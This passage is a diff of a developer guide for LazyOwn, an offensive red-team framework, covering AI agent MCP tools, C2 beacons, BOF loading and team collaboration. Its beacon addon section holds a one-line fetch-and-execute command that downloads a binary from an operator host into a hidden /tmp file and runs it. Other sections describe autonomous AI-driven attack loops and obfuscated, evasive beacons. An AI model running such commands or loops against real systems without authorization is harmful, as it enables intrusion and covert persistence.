+**Known issue**: two `class Config` defs in `utils.py` (3229, 3328). Second is duplicate — don't add a third; deduplicate first in a separate change before editing.
 
 ---
 
-## 8. MCP layer — `skills/lazyown_mcp.py`
+## 8. MCP — `skills/lazyown_mcp.py`
 
-The MCP server exposes ~95 tools to Claude Code. It **never re-implements** CLI
-or C2 functionality; it imports `LazyOwnShell` (or composes shell + REST + file
-reads) and calls existing methods.
+~95 tools. **Never re-implements** CLI/C2 — imports `LazyOwnShell` or composes shell + REST + file reads.
 
-Adding an MCP tool — happy path:
+### Adding a tool — happy path
+1. Functionality must exist as `do_*` / utils helper / C2 endpoint first.
+2. Name `lazyown_<verb>_<noun>` (e.g. `lazyown_get_config`).
+3. Document params via JSONSchema; mark required/optional explicitly.
+4. Return structured JSON (objects/lists), not prose.
+5. Run `bash skills/mcp_restart.sh` after editing.
 
-1. The underlying functionality must already exist as a `do_*` command, a CLI
-   helper in `utils.py`, or a C2 endpoint. If not, add it there first.
-2. Register the tool with the MCP server's tool decorator. Name it
-   `lazyown_<verb>_<noun>` (e.g. `lazyown_get_config`).
-3. Document parameters as JSONSchema. Mark required vs optional explicitly.
-4. Return structured JSON (objects / lists), not free-form prose. Claude reads
-   the result; downstream agents pipeline the JSON.
-5. After editing the MCP server, run `bash skills/mcp_restart.sh` so the next
-   tool call picks up the new code.
-
-Sad paths:
-
-- **Tool name collision** — the MCP discovers addons (`lazyaddons/*.yaml`),
-  plugins (`plugins/*.lua`), and pwntomate `.tool` files at startup. Picking a
-  generic name shadows them; prefix unambiguously.
-- **Long-running calls** — tools that wrap `lazynmap` / `pwntomate` must run
-  detached and return immediately, with a follow-up `*_status` tool to poll.
-- **Stale config** — never cache `payload.json` inside the MCP process across
-  calls. Always re-read it; the operator may have set keys via the CLI.
+### Sad paths
+- Name collision → MCP discovers addons (`lazyaddons/*.yaml`), plugins (`plugins/*.lua`), `.tool` files at startup. Prefix unambiguously.
+- Long-running → detach + return; add `*_status` poll tool.
+- Never cache `payload.json` across calls — operator may have changed it via CLI.
 
 ---
 
-## 9. Sessions/ — campaign state, treat as authoritative
+## 9. `sessions/` — authoritative campaign state
 
-`sessions/` is the **only** durable, cross-process location for engagement
-state. Never delete its contents without explicit operator confirmation.
-
-Conventions (consumers depend on these exact names):
+**Only** durable cross-process location. Never delete without operator confirmation.
 
 | File | Producer | Consumer |
 |------|----------|----------|
-| `scan_<rhost>.nmap`, `scan_<rhost>.nmap.xml` | `do_lazynmap` | autonomous_daemon, pwntomate, FactStore |
+| `scan_<rhost>.nmap[.xml]` | `do_lazynmap` | autonomous_daemon, pwntomate, FactStore |
 | `vulns_<rhost>.nmap` | `do_lazynmap` (vuln scripts) | reactive_engine |
 | `<ip>/<port>/<tool>/*.txt` | pwntomate | bridge_suggest, threat_model |
 | `logs/command_<tool>output<domain>.txt` | run_command CSV logger | facts_show |
 | `LazyOwn_session_report.csv` | every command | timeline_narrator, threat_model |
-| `credentials*.txt`, `hash*.txt` | reactive_engine, do_responder, etc. | every later phase |
+| `credentials*.txt`, `hash*.txt` | reactive_engine, do_responder | later phases |
 | `world_model.json` | autonomous_daemon | session_state, recommend_next |
 | `tasks.json` | campaign_tasks | sitrep, dashboard |
 | `objectives.jsonl` | inject_objective | autonomous_daemon |
-| `sessionLazyOwn.json` | shell shutdown / shift handoff | sitrep, c2_notes |
+| `sessionLazyOwn.json` | shutdown/handoff | sitrep, c2_notes |
 | `os.json` | do_ping, beacon ground truth | every selector |
 | `events.jsonl`, `autonomous_events.jsonl` | event_engine, daemon | poll_events |
 | `campaign_lessons.jsonl` | EpisodeReflectionEngine | next campaign |
 | `policy_facts.json` | policy engine | dashboard |
 | `captured_images/` | decoy site | operator review |
-| `keyword_fallback_index.json` | rag fallback when ChromaDB absent | rag_query |
-| `blacksandbeacon` | `blacksandbeacon` addon (`make`) | collab_join delivery, manual drop on target |
-| `bof_loader` | `blacksandbeacon_bof` addon (`make bof`) | manual BOF delivery to live beacon session |
+| `keyword_fallback_index.json` | rag fallback (no ChromaDB) | rag_query |
+| `blacksandbeacon` | `blacksandbeacon` addon (`make`) | collab_join delivery |
+| `bof_loader` | `blacksandbeacon_bof` addon (`make bof`) | manual BOF delivery to live beacon |
 
-Before any tool runs:
-1. `ls sessions/` to see what already exists.
-2. Read it. If the answer is already there, do not re-scan.
+Before any tool: (1) `ls sessions/`, (2) read existing artefacts. If answer exists, don't re-scan.
 
 ---
 
-## 10. Coding standards — non-negotiable
+## 10. Coding standards (enforced by review)
 
-These rules are enforced by review. Code that violates them is rejected.
-
-1. **English only.** Identifiers, strings, log messages, docstrings — all
-   English. The existing codebase has a few Spanish docstrings; do not add new
-   ones, and prefer translating when you touch the surrounding lines.
-2. **No comments.** Self-explanatory names + docstrings only. The only
-   acceptable inline comment is a single-line note about a non-obvious
-   constraint or a CVE reference.
-3. **No emojis** in code, log strings, or docs unless the operator explicitly
-   asked. The banner art and ASCII logo are not emojis and are allowed.
-4. **Docstrings on every public function and class.** Format:
+1. **English only.** Identifiers, strings, logs, docstrings. Translate Spanish remnants when you touch them.
+2. **No comments.** Self-explanatory names + docstrings. Single-line note OK for non-obvious constraint or CVE ref.
+3. **No emojis** in code/logs/docs unless operator asked. Banner ASCII art OK.
+4. **Docstrings on every public function/class**:
    ```python
    def foo(bar: str) -> dict:
-       """One-sentence summary.
+       """One-line summary.
 
        Args:
            bar: …
-
        Returns:
            …
-
        Raises:
            …
        """
    ```
-5. **No magic numbers.** Constants live in `class Config` (when shared across
-   the framework) or as `UPPER_SNAKE_CASE` module-level constants.
-6. **No hardcoded paths, ports, IPs, wordlists, credentials.** If the value
-   would be reused, put it in `payload.json`. If it is purely local to a
-   module, use a module constant.
-7. **SOLID** — every change must respect:
-   - **S**ingle responsibility: one reason to change per class / function.
-   - **O**pen/closed: extend via new addon YAML / new MCP tool / new selector
-     subclass — do not edit a hot path to special-case one target.
-   - **L**iskov substitution: any new selector must honour the
-     `BaseSelector.suggest()` contract.
-   - **I**nterface segregation: small, role-specific protocols (recon,
-     exploit, cred, lateral, privesc).
-   - **D**ependency inversion: high-level orchestration depends on the abstract
-     `LLMBackend`, `MemoryStore`, `Selector` — never on Groq or ChromaDB
-     directly.
-8. **Best architecture for the problem.** When two patterns fit, pick the one
-   already in use elsewhere in the codebase. Consistency beats novelty.
-9. **No partial implementations.** Either the feature works end-to-end (CLI ↔
-   payload.json ↔ MCP ↔ sessions/ artefact) or it isn't merged.
-10. **No backwards-compatibility shims** for code that hasn't shipped to
-    operators yet. Just change it.
-11. **Every new directory gets a README.** See §2 "Directory README convention"
-    for content rules. No exceptions.
+5. **No magic numbers** — constants in `class Config` (shared) or `UPPER_SNAKE_CASE` module-level.
+6. **No hardcoded paths/ports/IPs/wordlists/creds** — `payload.json` if reused, module constant if local.
+7. **SOLID**:
+   - **S**: one reason to change per class/fn.
+   - **O**: extend via new addon/MCP tool/selector — don't edit hot paths.
+   - **L**: new selector honours `BaseSelector.suggest()` contract.
+   - **I**: small role-specific protocols (recon/exploit/cred/lateral/privesc).
+   - **D**: orchestration depends on `LLMBackend`/`MemoryStore`/`Selector` abstractions, not Groq/ChromaDB directly.
+8. **Consistency beats novelty** — when two patterns fit, pick the one already used.
+9. **No partial implementations** — end-to-end (CLI ↔ payload.json ↔ MCP ↔ `sessions/` artefact) or not merged.
+10. **No backwards-compat shims** for unshipped code — just change it.
+11. **Every new directory gets a README** (see §2 rules). No exceptions.
 
 ---
 
-## 11. Spec-driven development — happy path / sad path discipline
+## 11. Spec-driven discipline (in commit/PR body, not code)
 
-For every change, write down (in commit message or PR body — not in the code):
+**Happy path**: trigger? inputs (payload keys/CLI args/MCP params)? success outcome (`sessions/` file / event / return value)? operator-visible signal?
 
-### Happy path
-- Trigger: who/what calls this?
-- Inputs: which `payload.json` keys, which CLI args, which MCP params?
-- Successful outcome: which file in `sessions/`, which event, which return
-  value?
-- Observable signal: what does the operator see?
-
-### Sad paths (enumerate at least these)
-- Required `payload.json` key missing or empty.
-- External binary or wordlist not installed.
+**Sad paths** (≥ 6 considered per change):
+- Required payload key missing/empty.
+- External binary or wordlist absent.
 - Network unreachable / timeout / TLS error.
-- Target OS does not match command (Windows tool against Linux box, etc.).
+- Target OS mismatch.
 - Output already exists in `sessions/` — must not redo destructive work.
-- Concurrent writer on the same artefact (CLI + daemon both running).
-- AV/EDR detected on the target — reactive_engine raises `escalate_evasion`.
-- Operator interrupts (SIGINT) — `signal_handler` must clean up tmux/sockets.
-- Long-running tool exceeds the documented runtime — never auto-kill, log and
-  continue.
-- Phishing template / route name fails validation — render the form again with
-  a flash error, never `500`.
+- Concurrent writer (CLI + daemon).
+- AV/EDR detected → reactive_engine raises `escalate_evasion`.
+- SIGINT → `signal_handler` cleans tmux/sockets.
+- Long-running tool exceeds runtime — never auto-kill, log + continue.
+- Phishing template/route name fails validation → re-render form w/ flash error, never `500`.
 
-Every command and every route gets at least 6 sad paths considered. If a sad
-path has no defensive code, justify it explicitly (e.g. "trust internal call
-from `do_assign`, validated upstream").
+If a sad path has no defensive code, justify explicitly (e.g. "trusted internal call from `do_assign`, validated upstream").
 
 ---
 
-## 12. Prompt and context engineering for the agents
+## 12. Agent prompt/context engineering
 
-When this codebase invokes Claude/Groq/Ollama (via `lazyown_llm_ask`,
-`swan_run`, `hive_spawn`, `groq_agent`):
+When invoking Claude/Groq/Ollama (`lazyown_llm_ask`, `swan_run`, `hive_spawn`, `groq_agent`):
 
-1. **System prompt** — set the persona explicitly (`sessions/soul.md` is the
-   canonical persona file). Include hard stops (PII, customer-of-customer,
-   destructive ops).
-2. **Context window** — include only what changes the next decision:
-   - Current phase from `world_model.json`.
-   - The 3 most recent commands and outputs from `LazyOwn_session_report.csv`.
-   - Top-3 pivot candidates from `world_model.NetworkGraph.centrality()`.
-   - Active objective from `objectives.jsonl`.
-   - Captured creds (only the ones relevant to the current target).
-3. **Tool catalogue** — pass the bridge catalog filtered to the current phase
-   and OS, never the full 347 commands.
-4. **Output contract** — request structured JSON (`{"command": "...",
-   "reasoning": "...", "mitre": "Txxx"}`); reject free-form prose.
-5. **Reward shaping** — every executed step is scored by the Detection Oracle
-   and OutcomeEvaluator; the reward is propagated to the RL Q-table and MoE
-   expert weights. New selectors must emit a reward in `[0, 1]` to participate.
+1. **System prompt** — persona from `sessions/soul.md` (canonical). Include hard stops (PII, customer-of-customer, destructive ops).
+2. **Context window** — only what changes next decision:
+   - Current phase (`world_model.json`).
+   - Last 3 commands+outputs (`LazyOwn_session_report.csv`).
+   - Top-3 pivot candidates (`world_model.NetworkGraph.centrality()`).
+   - Active objective (`objectives.jsonl`).
+   - Relevant captured creds.
+3. **Tool catalogue** — filter bridge catalog to current phase + OS, never all 347 commands.
+4. **Output contract** — request `{"command": "...", "reasoning": "...", "mitre": "Txxx"}`. Reject prose.
+5. **Reward shaping** — Detection Oracle + OutcomeEvaluator score each step → propagated to RL Q-table + MoE weights. New selectors emit reward `∈ [0, 1]`.
 
-`sessions/soul.md` is the only file that can carry persistent persona/policy
-between sessions. Use `lazyown_soul(action="write", content=...)` to update it.
+`sessions/soul.md` = only persistent persona/policy file. Update via `lazyown_soul(action="write", content=...)`.
 
 ---
 
-## 13. Extending the framework — pick the right surface
+## 13. Pick the right extension surface
 
 | Goal | Surface |
 |------|---------|
-| Wrap an existing GitHub tool | `lazyaddons/<name>.yaml` (declarative) |
-| Add a one-liner / payload generator | `plugins/<name>.lua` |
-| Auto-run on a discovered service | `tools/<name>.tool` (pwntomate) |
+| Wrap existing GitHub tool | `lazyaddons/<name>.yaml` |
+| One-liner / payload generator | `plugins/<name>.lua` |
+| Auto-run on discovered service | `tools/<name>.tool` |
 | New CLI command | `do_<name>` in `lazyown.py` |
-| New web UI page or beacon endpoint | `lazyc2.py` route + Jinja2 template |
-| New Flask blueprint | `modules/<name>_bp.py` — register in `lazyc2.py`; pass config via `app.config["LAZYOWN_CONFIG"]` |
+| New web UI page / beacon endpoint | `lazyc2.py` route + Jinja2 |
+| New Flask blueprint | `modules/<name>_bp.py` + register in `lazyc2.py`; config via `app.config["LAZYOWN_CONFIG"]` |
 | New MCP tool | `skills/lazyown_mcp.py` |
 | New autonomous selector | subclass `BaseSelector` in `skills/autonomous_daemon.py` |
 | New AI agent persona | `skills/lazyown_groq_agents.py` registry |
-| New knowledge base | new parquet under `parquets/` + `lazyown_parquet_query` mode |
-| New directory | create the directory + `README.md` immediately (§10 rule 11) |
+| New knowledge base | new parquet + `lazyown_parquet_query` mode |
+| New directory | create + `README.md` immediately |
 
-Adding `do_*` for something that already works as a YAML addon is a smell —
-the YAML system exists precisely so you don't have to touch Python.
+Adding `do_*` for something that works as a YAML addon = smell.
 
-### Blueprint `template_folder` pattern
-
-Blueprints that live in `modules/` and need Jinja2 templates must set:
-
+**Blueprint `template_folder` pattern**:
 ```python
 bp = Blueprint("name", __name__, template_folder="../templates")
 ```
-
-This makes `render_template("foo.html")` resolve against the root `templates/`
-directory rather than looking for a non-existent `modules/templates/`. Do not
-duplicate templates into `modules/templates/` — there is one template store.
+Resolves `render_template("foo.html")` against root `templates/`. Don't duplicate into `modules/templates/`.
 
 ---
 
 ## 14. Things this framework deliberately does NOT do
 
-- **Detection evasion as the primary feature.** Stealth modules exist but the
-  framework is for authorized red team / pentesting. Do not add features whose
-  only purpose is to evade defenders without an authorized engagement context.
-- **Persist secrets in git.** `cert.pem`, `key.pem`, `payload.json`'s
-  `api_key`, and `sessions/credentials*` must never be committed.
-- **Run on Windows as a host.** `lazyown.py` exits if `os.name == 'nt'`. The
-  framework targets Linux/macOS operators attacking Linux/Windows victims.
-- **Mock infrastructure in tests.** `tests/` exercise real modules; integration
-  tests like `tests/integration_autonomous_flow.py` run against fixtures in
-  `sessions/` — never mock the C2 or the autonomous daemon.
+- Detection evasion as primary feature (only in authorized engagements).
+- Persist secrets in git (`cert.pem`, `key.pem`, `api_key`, `sessions/credentials*`).
+- Run on Windows as host (`lazyown.py` exits if `os.name == 'nt'`). Linux/macOS operator targeting Linux/Win victims.
+- Mock C2 or daemon in tests — integration tests run against `sessions/` fixtures.
 
 ---
 
-## 15. Quick command cheatsheet for Claude
+## 15. Quick MCP cheatsheet
 
 ```
-# Start of every session
-lazyown_session_init()
-lazyown_campaign_sitrep()
-
-# Configure
+lazyown_session_init() / lazyown_campaign_sitrep()
 lazyown_set_config(key="rhost", value="10.10.11.5")
-lazyown_set_config(key="domain", value="target.htb")
-lazyown_get_config()
-
-# Phase-driven recon
 lazyown_phase_guide(phase="recon")
-lazyown_run_command("ping")
 lazyown_run_command("lazynmap")
 lazyown_auto_populate(target="10.10.11.5")
 lazyown_facts_show(target="10.10.11.5", refresh=True)
-
-# Knowledge before action
 lazyown_searchsploit(query="<service> <version>")
-lazyown_parquet_query(mode="context", phase="enum", target="10.10.11.5")
+lazyown_parquet_query(mode="context", phase="enum", target="...")
 lazyown_rag_query(query="…", n=5)
-
-# Execute and learn
-lazyown_run_command("<verb>")
-lazyown_reactive_suggest(output="<raw output>", command="<verb>", platform="linux")
-
-# Autonomy
-lazyown_auto_loop(target="10.10.11.5", max_steps=10)
+lazyown_reactive_suggest(output="<raw>", command="<verb>", platform="linux")
+lazyown_auto_loop(target="...", max_steps=10)
 lazyown_autonomous_start(max_steps_per_objective=15)
 lazyown_swan_ensemble(task_type="…", task="…", phase="…")
 lazyown_hive_spawn(goal="…", n_drones=4, roles=["recon","exploit","cred","lateral"])
-
-# Reporting
-lazyown_generate_report(target="10.10.11.5", include_timeline=True)
+lazyown_generate_report(target="...", include_timeline=True)
 lazyown_report_update(action="auto_fill")
 lazyown_misp_export()
-
-# Multi-operator collaboration (CLI)
-collab_join <handle>           # print team dashboard URL + SSE endpoint
-collab_join alice --curl       # also print curl SSE command
+# CLI: collab_join <handle> [--curl]
 ```
 
 ---
 
-## 15a. Graph-aware navigation — `graphify` + `cli/graph_advisor.py`
+## 15a. Graph-aware navigation
 
-LazyOwn ships a knowledge graph of itself, built by the `/graphify` skill and
-stored under `graphify-out/graph_lazyown.json` (~1500 nodes, ~2900 edges,
-14 communities). The graph is consumed at runtime by
-`cli/graph_advisor.py` (SOLID, single file, fully tested in
-`tests/test_graph_advisor.py`) and surfaced in three places so neither
-humans nor agents have to re-read the JSON.
+Self-knowledge graph at `graphify-out/graph_lazyown.json` (~1500 nodes, ~2900 edges, 14 communities). Built by `/graphify`. Consumed by `cli/graph_advisor.py` (tested in `tests/test_graph_advisor.py`).
 
-**CLI**
+**CLI**: `graph_search <q> [n]`, `neighbors <node> [depth] [n]`, `god_nodes [N]`, `suggest_next [seeds...] [N]` (no seeds → reads `sessions/LazyOwn_session_report.csv`). Shell `default()` uses advisor for "did you mean…?".
 
-```
-graph_search <query> [limit]           # fuzzy rank nodes by label/id/source
-neighbors <node> [depth] [limit]       # walk the graph outward from one node
-god_nodes [N]                          # most-connected nodes (core abstractions)
-suggest_next [seeds...] [N]            # next-command recommendation; reads
-                                       # sessions/LazyOwn_session_report.csv
-                                       # when no seeds are passed
-```
+**MCP**: `lazyown_graph_summary`, `lazyown_graph_search`, `lazyown_graph_neighbors`, `lazyown_graph_suggest_next`. All accept `budget_tokens` (default 1500). Missing graph → `{"available": false, "reason": "..."}`.
 
-The shell's `default()` hook now uses the same advisor to surface
-"did you mean…?" suggestions when an unknown `do_*` is typed.
-
-**MCP**
-
-```
-lazyown_graph_summary()                # node/edge/community counts; sanity check
-lazyown_graph_search(query, limit)     # fuzzy node search, budget_tokens aware
-lazyown_graph_neighbors(node, depth)   # layered adjacency walk with edge metadata
-lazyown_graph_suggest_next(recent)     # next-step recommendation from recent
-                                       # activity (or pass an explicit seed list)
-```
-
-Every MCP graph tool accepts `budget_tokens` (default 1500) and trims its
-JSON response in-place so list-of-results responses never blow an agent's
-context window. When the graph is missing, every tool returns
-`{"available": false, "reason": "..."}` so callers can react cleanly.
-
-**Refreshing the graph**
-
-```
-/graphify .                            # full build (LLM-backed semantic
-                                       # extraction for docs/papers, AST for code)
-/graphify . --update                   # incremental; code-only edits skip the LLM
-```
-
-The advisor caches by `(path, mtime)` so a fresh `/graphify` rebuild is
-picked up automatically on the next CLI command or MCP call without
-restarting the shell or the MCP server.
+**Refresh**: `/graphify .` (full) or `/graphify . --update` (incremental). Advisor caches by `(path, mtime)` — picked up on next call, no restart needed.
 
 ---
 
-## 15b. Operator UX — inline hints + TUI dashboard
+## 15b. Operator UX
 
 ### Inline reactive hints — `cli/reactive_hints.py`
-
-A `register_postcmd_hook` callback fires after every `do_*` command and
-prints a single dim line of next-step suggestions before the next prompt:
-
+`register_postcmd_hook` prints one dim line after each `do_*`:
 ```
   ↳ do_gobuster · do_enum4linux · do_ffuf
 ```
+- Suggestions from `GraphAdvisor.suggest_next()`.
+- `SKIP_COMMANDS` (help/exit/dashboard/set/palette/…) never produce hints.
+- Toggle: `enable_inline_hints` in `payload.json` (default `true`).
+- Missing graph → no-op. Latency < 1 ms after first load.
+- Public surface: `render_inline_hints(advisor, last_command, limit, enabled)`. Output via `rich.console.Console`. Hook returns `data` unchanged (cmd2 passes `PostcommandData` by reference).
 
-Rules:
+### Dashboard TUI — `cli/dashboard_tui.py`
+`dashboard` cmd launches Textual app (blocking, **Q** quits). `LazyOwnDashboard(App)` accepts `payload_path` + `sessions_dir`. Widgets: `TargetPanel` → `KillChainPanel` + `ConfigPanel` → `CommandsPanel` → `OpsPanel` → `HintBar`. `_do_refresh()` on mount + every `REFRESH_INTERVAL` (5s) via `set_interval`. Entry: `launch(payload_path, sessions_dir)`. Requires `pip install textual`.
 
-- Suggestions come from `GraphAdvisor.suggest_next()` — structurally grounded,
-  not a generic list.
-- Commands on `SKIP_COMMANDS` (help, exit, dashboard, set, palette, …) never
-  produce hints.
-- Controlled by `enable_inline_hints` in `payload.json` (default `true`).
-  Operators disable with `set enable_inline_hints false`.
-- When the graph is absent the hook is a no-op — no error, no output.
-- Never adds latency beyond graph lookup time (< 1 ms after first load).
-
-Implementation notes for contributors:
-
-- `render_inline_hints(advisor, last_command, limit, enabled)` is the only
-  public surface. The caller owns the advisor instance.
-- Output goes through `rich.console.Console` so ANSI colours are handled
-  correctly on all terminals and piped output.
-- The hook must return `data` unchanged — cmd2 passes `PostcommandData` by
-  reference through the chain.
-
-### Operator TUI dashboard — `cli/dashboard_tui.py`
-
-`dashboard` (CLI command) launches a full-screen Textual application that
-blocks the shell while open (like `htop` or `lazygit`). Press **Q** to quit
-and return to the cmd2 prompt.
-
-Architecture:
-
-- `LazyOwnDashboard(App)` — the Textual root; accepts `payload_path` and
-  `sessions_dir` so tests and alternate configs work cleanly.
-- Widget hierarchy: `TargetPanel` → `KillChainPanel` + `ConfigPanel` →
-  `CommandsPanel` → `OpsPanel` → `HintBar`.
-- `_do_refresh()` is called on mount and every `REFRESH_INTERVAL` (5s) via
-  `set_interval`. Each widget receives typed data dicts — no widget touches
-  the filesystem directly.
-- `launch(payload_path, sessions_dir)` is the only public entry point.
-  `do_dashboard` in `lazyown.py` calls it after a try/import guard.
-
-Data helpers (all pure, tested independently):
-
-| Helper | Source |
-|--------|--------|
-| `_read_json(path)` | Any JSON file; returns `{}` on error |
-| `_read_recent_commands(limit)` | `sessions/LazyOwn_session_report.csv` |
-| `_count_lines_in_glob(pattern)` | `sessions/credentials*.txt` etc. |
-| `_beacon_count()` | `sessions/beacons.json` |
-| `_graph_hints(limit)` | `graphify-out/graph_lazyown.json` via `GraphAdvisor` |
-
-Requires `pip install textual` (added to `install.sh` and `requirements`).
+Pure helpers (tested independently): `_read_json`, `_read_recent_commands`, `_count_lines_in_glob`, `_beacon_count`, `_graph_hints`.
 
 ---
 
-## 15c. Beacon family — Linux BOF (`blacksandbeacon`)
-
-LazyOwn ships two beacon lines. Pick the right one for the engagement:
+## 15c. Beacon family
 
 | Beacon | File | OS | BOF | Notes |
 |--------|------|----|-----|-------|
-| Go beacon | built-in (`do_lazymsfvenom`, `lazyc2`) | Win/Lin/Mac | No | XOR-encoded two-stage; AES-256 C2 channel; Garble-obfuscated |
-| Windows C beacon | `lazyaddons/beacon.yaml` | Windows | Yes (Early Bird APC) | Pairs with malleable C2 profile; NT Native API |
-| **Linux C beacon** | **`lazyaddons/blacksandbeacon.yaml`** | **Linux** | **Yes (ELF dlopen)** | **Only open-source Linux BOF; direct syscalls** |
-| Linux BOF loader | `lazyaddons/blacksandbeacon_bof.yaml` | Linux | — | Delivers compiled `.so` BOF to a live beacon session |
-| ARM beacon | `blackzincbeacon` (external) | ARM/IoT | Planned | Embedded targets |
+| Go beacon | built-in (`do_lazymsfvenom`, `lazyc2`) | Win/Lin/Mac | No | XOR 2-stage, AES-256 C2, Garble-obfuscated |
+| Windows C beacon | `lazyaddons/beacon.yaml` | Win | Yes (Early Bird APC) | Malleable C2; NT Native API |
+| **Linux C beacon** | **`lazyaddons/blacksandbeacon.yaml`** | **Linux** | **Yes (ELF dlopen)** | **Only OSS Linux BOF; direct syscalls** |
+| Linux BOF loader | `lazyaddons/blacksandbeacon_bof.yaml` | Linux | — | Delivers `.so` BOF to live beacon |
+| ARM beacon | `blackzincbeacon` (external) | ARM/IoT | Planned | Embedded |
 
 ### Linux BOF contract
+- Compile PIC ELF: `gcc -shared -fPIC -nostartfiles -o mybof.so mybof.c`
+- `datap` API (`BeaconDataParse`/`Int`/`Extract`, `BeaconPrintf`, `BeaconOutput`) source-compatible w/ Windows BOF — port by swapping Win32 for Linux syscalls/libc.
+- Loaded at runtime via `dlopen`; no new process, no disk write after delivery.
 
-- BOFs compile as position-independent ELF shared objects:
-  `gcc -shared -fPIC -nostartfiles -o mybof.so mybof.c`
-- The `datap` API (`BeaconDataParse`, `BeaconDataInt`, `BeaconDataExtract`,
-  `BeaconPrintf`, `BeaconOutput`) is source-compatible with Windows BOF — port
-  by replacing Win32 calls with Linux syscalls or libc equivalents.
-- The beacon loads BOFs at runtime via `dlopen`; no new process, no disk write
-  after delivery.
-
-### Addon YAML pattern (for both beacons)
-
+### Addon YAML pattern (both beacons)
 ```yaml
 install_command: make
 execute_command: git restore . ; git pull ; make && cp <binary> ../../../sessions/<binary>
 lazycommand: curl -sk "http://{lhost}:{lport}/<binary>" -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc &
 ```
+Rules: always `git restore . ; git pull` before `make`; stage to `sessions/<binary>`; use `{lhost}`/`{lport}` placeholders; never hardcode.
 
-Key rules:
-- Always `git restore . ; git pull` before `make` so the binary is fresh.
-- Stage artefacts to `sessions/<binary>` — the C2 serves them from there.
-- `lazycommand` uses `{lhost}` and `{lport}` placeholders — never hardcode.
-- `download_file` names the path on the target side (for reference in docs only).
-
-### Tests
-
-`tests/test_blacksandbeacon_addon.py` — 59 tests covering: YAML structure,
-required fields, tool section keys, path safety (no `../` traversal), category,
-params contract, `{lhost}`/`{lport}` template placeholders, `sessions/` staging,
-`git restore + pull` before build, description quality, no hardcoded IPs/ports.
+Tests: `tests/test_blacksandbeacon_addon.py` (59 tests — YAML structure, required fields, path safety, template placeholders, no hardcoded IPs/ports).
 
 ---
 
 ## 15d. Multi-operator collaboration — `collab_bp`
 
-`modules/collab_bp.py` is a Flask blueprint providing real-time team server
-functionality. It activates automatically when `lazyc2.py` starts.
-
-### Architecture (SOLID)
+`modules/collab_bp.py` — Flask blueprint, real-time team server. Auto-activates on `lazyc2.py` start.
 
 | Class | Responsibility |
-|-------|---------------|
-| `EventBus` | In-process SSE pub/sub; per-subscriber `Queue`; replays last 20 events on join |
-| `LockManager` | Advisory per-target locks with TTL expiry; prevents two operators running tools against the same host |
-| `OperatorRegistry` | Tracks connected operators; marks stale (> 90 s without heartbeat) as inactive |
+|-------|----------------|
+| `EventBus` | In-process SSE pub/sub; per-subscriber `Queue`; replays last 20 on join |
+| `LockManager` | Advisory per-target locks w/ TTL; prevents two operators on same host |
+| `OperatorRegistry` | Tracks operators; > 90 s no heartbeat → inactive |
 | `ColabEvent` | Value object: `type`, `payload`, `operator`, `ts`, `id` |
 
-Module-level singletons (`_bus`, `_locks`, `_registry`) are injected into the
-blueprint via closure. Other modules broadcast events with:
+Module singletons (`_bus`, `_locks`, `_registry`) injected via closure. Broadcast:
 ```python
 from collab_bp import publish_event
 publish_event(type="finding", payload={"target": "...", "detail": "..."}, operator="alice")
 ```
 
-### Endpoints
-
 | Endpoint | Method | Description |
 |---|---|---|
-| `/collab/` | GET | Full-screen browser dashboard (`templates/collab.html`) |
-| `/collab/stream?operator=<name>` | GET (SSE) | Real-time event stream; keepalive every 15 s |
-| `/collab/operators` | GET | Active operator list + join timestamps |
-| `/collab/publish` | POST | Broadcast a structured event (type, payload, operator) |
-| `/collab/lock` | POST | Acquire advisory target lock (body: target, operator, ttl_secs) |
-| `/collab/unlock` | POST | Release target lock |
-| `/collab/locks` | GET | All active locks with operator and TTL |
+| `/collab/` | GET | Browser dashboard (`templates/collab.html`) |
+| `/collab/stream?operator=<name>` | GET (SSE) | Real-time events; keepalive 15s |
+| `/collab/operators` | GET | Active operators |
+| `/collab/publish` | POST | Broadcast event (type, payload, operator) |
+| `/collab/lock` | POST | Acquire target lock (target, operator, ttl_secs) |
+| `/collab/unlock` | POST | Release lock |
+| `/collab/locks` | GET | Active locks w/ TTL |
 | `/collab/history?n=N` | GET | Last N events (max 500) |
 
-### `templates/collab.html`
+`templates/collab.html`: extends `base.html`. Operator presence, lock UI, SSE feed, chat, copyable join URL. Reads `c2_host`/`join_url` from Flask context — no hardcoded IPs.
 
-Extends `base.html`. Renders: operator presence panel, target lock UI (acquire /
-release), real-time event feed (SSE), chat broadcast input, and a copyable join
-URL. Reads `c2_host` and `join_url` from the Flask context injected by the UI
-route. No hardcoded IPs — all values come from `payload.json` via
-`app.config["LAZYOWN_CONFIG"]`.
-
-### `LAZYOWN_CONFIG` injection pattern
-
-`lazyc2.py` sets `app.config["LAZYOWN_CONFIG"] = config` immediately before
-`app.register_blueprint(collab_bp, ...)`. The blueprint reads it with:
+**LAZYOWN_CONFIG injection**:
 ```python
 cfg = current_app.config.get("LAZYOWN_CONFIG", {})
 lhost = cfg.get("lhost", "localhost") if hasattr(cfg, "get") else getattr(cfg, "lhost", "localhost")
 ```
-The `hasattr` guard handles both plain `dict` (tests) and `Config` objects
-(production). **This is the canonical pattern for blueprints that need payload
-values.** Do not pass `config` as a module-level import from `lazyc2.py`.
+The `hasattr` guard handles both `dict` (tests) and `Config` (prod). **Canonical pattern for blueprints needing payload values.** Don't import `config` from `lazyc2.py`.
 
-### `do_collab_join` CLI command
-
-Added to `lazyown.py`, category `10. Command & Control`. Usage:
+**`do_collab_join` CLI** (category 10 C&C):
 ```
 collab_join [handle] [--curl]
 ```
-Reads `lhost` and `c2_port` from `self.params` and prints the team dashboard
-URL, SSE stream URL, and all REST endpoints. `--curl` adds a ready-to-paste
-`curl --insecure -N` command for terminal SSE consumption.
+Reads `lhost`/`c2_port` from `self.params`. Prints dashboard URL, SSE URL, REST endpoints. `--curl` adds `curl --insecure -N` snippet.
 
-### Tests
-
-`tests/test_collab_and_onboarding.py` — 67 tests covering: `EventBus`
-(publish/subscribe, history replay, queue overflow), `LockManager` (acquire,
-deny, re-acquire, TTL expiry, release), `OperatorRegistry` (join, leave,
-heartbeat, stale expiry), all 8 Flask HTTP endpoints, `collab.html` template
-content, `QUICKSTART.md` completeness, wizard DIP contract, and `collab_join`
-CLI command structure.
+Tests: `tests/test_collab_and_onboarding.py` (67 — bus/locks/registry, all 8 HTTP endpoints, template content, `QUICKSTART.md`, wizard DIP, CLI cmd).
 
 ---
 
 ## 15e. Onboarding — `QUICKSTART.md` + `wizard`
 
